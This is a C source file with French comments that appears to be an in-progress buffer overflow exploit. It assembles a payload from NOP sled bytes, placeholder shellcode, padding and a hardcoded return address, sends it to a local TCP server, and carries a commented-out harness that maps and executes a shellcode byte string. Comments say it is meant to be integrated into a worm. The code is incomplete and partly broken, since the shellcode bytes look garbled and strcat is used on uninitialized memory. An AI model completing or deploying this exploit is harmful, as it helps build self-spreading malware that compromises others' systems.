#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h> // inet_addr()
#include <sys/socket.h>
#include <unistd.h> 

#define MAX 80
#define PORT 8080
#define SA struct sockaddr

#include <sys/mman.h>

// Voir fonction strcat pour concaténer des chars (string.h)

size_t pay_size;


unsigned long get_sp(void) {
__asm__("movq %rsp,%rax");
}


char* crafted_payload(){

	// Serie de NOP
	int nb_nop = 11;
	char *nops = malloc(nb_nop * sizeof(char));
	for (int i = 0; i < nb_nop; i++){
		//nops[i] = "\x90";
		strcat(nops, "\x90");
	}
	//printf("%s\n", nops);

	// Shellcode en dur
	//char shellcode[] = "\xf3\x48\x48\x48\x74\xff\x48\xc3\xff\xf2\x0f\xf3\x68\xf2\x90\xf3\xf2\x0f\xf3\xf2\x0f\xf3\x31\x49\x5e\x48\x48\x50\x54\x45\x31\x48\xff\xf4\x66\x00\x48\x48\x48\x74\x48\x48\x74\xff\x0f\xc3\x0f\x48\x48\x48\x48\x48\x48\x48\x48\x74\x48\x48\x74\xff\x66\xc3\x0f\xf3\x80\x75\x55\x48\x00\x48\x74\x48\xe8\xe8\xc6\x5d\xc3\x0f\xc3\x0f\xf3\xe9\xf3\x55\x48\x48\x48\xe8\xb8\x5d\xc3\xf3\x48\x48\xc3";
	//char shellcode[] = "\x48\x45\x4c\x4c\x43\x4f\x44\x45";
	char shellcode[] = "\x41";
	//printf("%s\n", shellcode);

	// Padding de bp
	char padding_bp [] = "\x41";
	//printf("%s\n", padding_bp);

	// Adresse de retour en dur
	//char retour[] = "\x01\x40\x73\x74\x88\x34\x60\xb2";
	//char retour[] = "\x41\x44\x44\x52\x5f\x52\x45\x54";
	char retour[] = "\x8f\x54\x55\x55\x55\x55";
	//printf("%s\n", retour);

	char *final_buf = malloc((strlen(nops) + strlen(shellcode) + strlen(padding_bp) + strlen(retour)) * sizeof(char));

	strcat(final_buf, nops);
	strcat(final_buf, shellcode);
	strcat(final_buf, padding_bp);
	strcat(final_buf, retour);
	//printf("%s\n", final_buf);

	pay_size = strlen(final_buf);
	//printf("%zu\n", pay_size);

	char * pay = malloc(strlen(final_buf) * sizeof(char));
	//printf("%zu\n", sizeof(pay));
	strcpy(pay, final_buf);
	//printf("%s\n", pay);

	free(nops);
	free(final_buf);

	return pay;

	free(pay);
}


int func(int sockfd, const char *pay)
{
	printf("Overflow en cours...\n");
	int verif = write(sockfd, pay, strlen(pay));
	if (verif == -1){
		printf("Error : Payload sending failed\n");
	}
	else {
		printf("Payload successfully send !\n");
	}
	return verif;
}




int main (int argc, char *argv[]){

	int sockfd, connfd;
	struct sockaddr_in servaddr, cli;

	// socket create and verification
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1) {
		printf("socket creation failed...\n");
		exit(0);
	}
	else
		printf("Socket successfully created..\n");
	bzero(&servaddr, sizeof(servaddr));

	// assign IP, PORT
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	servaddr.sin_port = htons(PORT);

	// connect the client socket to server socket
	if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr))
		!= 0) {
		printf("connection with the server failed...\n");
		exit(0);
	}
	else
		printf("connected to the server..\n");


	//int sockfd = 1; // A CHANGER ET METTRE L'ARG DE LA FCT A LA PLACE 

	//printf("%li\n", pay_size);
	/*char payload[pay_size];
	const char *str = crafted_payload();
	size_t len = strlen(str);
	printf("%li\n", sizeof(payload));
	memset(payload, 0, sizeof(payload));
	memcpy(payload, str, len);*/
	//snprintf(payload, pay_size, crafted_payload());


	char* payload = crafted_payload();

	
    // Ecriture en dur du shellcode : 
    // NOP *40(etc 1 octet chaque)
	// + shellcode (taille à définir POUR TAILLE BOF) 
    // + "A" *4(1 octet chaque)
	// + @retour_dans_nop (== @relatif A CHERCHER GDB BASE PILE - [size(shellcode) + 4* A + moitié Nop])
    //const char * payload = "\x90\x90\x90\x90\x90\x48\x45\x4c\x4c\x43\x4f\x44\x45\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"; // A COMPLETER

    // COMMENT @retour = @base pile + taille instruction ENTIERE

    // Envoi de la payload
	//long l=get_sp();
	//printf("Ox%lu\n", l);

	int over_flow = func(sockfd, payload);  // A DECOMMENTER UNE FOIS INTEGREE DANS LE VERS

	//printf("%li\n", strlen(payload));
    printf("%s\n", payload);
	printf("OK\n");

	free(payload);



	/*// TEST SHELLCODE BIEN CREE
	char shellcode[] = "\xf3\x48\x48\x48\x74\xff\x48\xc3\xff\xf2\x0f\xf3\x68\xf2\x90\xf3\xf2\x0f\xf3\xf2\x0f\xf3\x31\x49\x5e\x48\x48\x50\x54\x45\x31\x48\xff\xf4\x66\x00\x48\x48\x48\x74\x48\x48\x74\xff\x0f\xc3\x0f\x48\x48\x48\x48\x48\x48\x48\x48\x74\x48\x48\x74\xff\x66\xc3\x0f\xf3\x80\x75\x55\x48\x00\x48\x74\x48\xe8\xe8\xc6\x5d\xc3\x0f\xc3\x0f\xf3\xe9\xf3\x55\x48\x48\x48\xe8\xb8\x5d\xc3\xf3\x48\x48\xc3";
	void * shell = mmap(NULL, sizeof(shellcode), PROT_EXEC, MAP_ANONYMOUS, -1, 0);
	memcpy(shell, shellcode, sizeof(shellcode));
	int (*fct)() = (int (*)()) shell;
	fct();*/



    return 0;
}



// A FAIRE

// d'abord avec petite data, faire sauter une instruction
// int a = 1
// strcpy(...) == overflow !
// int a = 50
// printf("%i", a);

// ne faire sauter QUE instruction pour a = 50
// afin de print a = 1

// d'ou utiliser GDB pour disass le code et retrouver les adresses des instructions
// et ainsi mettre en adresse de retour le printf
// (sauter juste instructions pour a = 50)

// on aura ainsi la certitude de l'adresse de retour



// autre inconnues : - shellcode qui s'exécute bien
//					 - payload bien craftée OK



// autres infos gdb : adresse de retour d'une fonction dans le main
// == instruction juste après appel dans main

// gcc -g + list / break (b) 7 / run / backtrace / x/10gx main (10 fois 64 bits) / info frame (info contexte, rip, rbp)